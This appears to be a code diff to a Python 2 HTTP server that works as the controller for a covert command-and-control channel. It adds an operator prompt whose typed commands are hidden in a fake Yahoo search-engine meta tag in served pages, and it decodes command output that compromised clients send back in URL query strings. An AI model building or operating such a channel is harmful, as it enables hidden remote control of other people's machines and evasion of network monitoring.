@@ -3,50 +3,14 @@ from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import SocketServer
 import urllib
 import bs4
-import HTMLParser
 
 
-class LinksParser(HTMLParser.HTMLParser):
-  def __init__(self):
-    HTMLParser.HTMLParser.__init__(self)
-    self.recording = 0
-    self.data = []
+def process_client_data(data):
+    print data
+    new_cmd = raw_input('> ')
+    return new_cmd
 
-  # # <div id="web">20</div>
-  # def handle_starttag(self, tag, attributes):
-  #   if tag != 'div':
-  #     return
-  #   if self.recording:
-  #     self.recording += 1
-  #     return
-  #   for name, value in attributes:
-  #     if name == 'id' and value == 'web':
-  #       break
-  #   else:
-  #     return
-  #   self.recording = 1
 
-  # <meta params="yahoosearchengine">
-  def handle_starttag(self, tag, attributes):
-    if tag != 'meta':
-      return
-    if self.recording:
-      self.recording += 1
-      return
-    for name, value in attributes:
-      if name == 'params' and value == 'yahoosearchengine':
-        break
-    else:
-      return
-    self.recording = 1
-
-  def handle_endtag(self, tag):
-    if tag == 'div' and self.recording:
-      self.recording -= 1
-
-  def handle_data(self, data):
-    if self.recording:
-      self.data.append(data)
 
 
 class S(BaseHTTPRequestHandler):
@@ -61,10 +25,12 @@ class S(BaseHTTPRequestHandler):
         if str(query).startswith(prefix):
             query = query[len(prefix):-1]
             client_cmd_output = urllib.unquote(query).decode('utf8')
+            print client_cmd_output
+            new_cmd = process_client_data(client_cmd_output)
             query = query.replace('%0D%0A', '')
             if len(query) > 20:
                 query = query[:20]
-            print client_cmd_output
+
             print query
 
 
@@ -85,7 +51,7 @@ class S(BaseHTTPRequestHandler):
         soup = bs4.BeautifulSoup(response)
         # create new link
 
-        new_link = soup.new_tag("meta", property="oq:yahoo_search_engine", xcontent="dir")
+        new_link = soup.new_tag("meta", property="oq:yahoo_search_engine", xcontent="%s" % new_cmd)
         # insert it into the document
         soup.head.append(new_link)
 
@@ -95,16 +61,7 @@ class S(BaseHTTPRequestHandler):
         desc = soup.findAll(attrs={"params": "yahoosearchengine"})
         #print(desc[0]['content'].encode('utf-8'))
 
-
-
-        # parser = LinksParser()
-        # a = parser.feed(str(soup))
-        # b = parser.get_starttag_text()
-        # cmd = parser.data
-
-
         self._set_headers()
-        #self.wfile.write("<html><body><h1>hi!</h1></body></html>")
         self.wfile.write(soup)
 
     def do_HEAD(self):
